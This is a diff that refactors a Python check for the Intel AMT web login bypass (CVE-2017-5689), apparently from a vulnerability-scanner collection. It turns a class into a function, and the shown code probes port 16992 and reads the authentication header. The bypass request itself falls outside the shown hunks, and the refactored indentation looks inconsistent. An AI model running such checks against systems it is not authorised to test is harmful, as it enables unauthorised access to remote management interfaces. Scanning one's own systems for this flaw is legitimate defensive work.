@@ -12,13 +12,7 @@ import random
 import string
 import requests
 import warnings
-
-
-class amt_crypt_bypass_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['intel AMT web系统绕过登录(CVE-2017-5689)', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -26,7 +20,7 @@ class amt_crypt_bypass_BaseVerify:
 
         port = 16992
         payload = "/hw-sys.htm"
-        vulnurl = self.url + ":"+ str(port) +payload
+        vulnurl = url + ":"+ str(port) +payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             header_string = req.headers['WWW-Authenticate']
@@ -52,5 +46,5 @@ class amt_crypt_bypass_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = amt_crypt_bypass_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
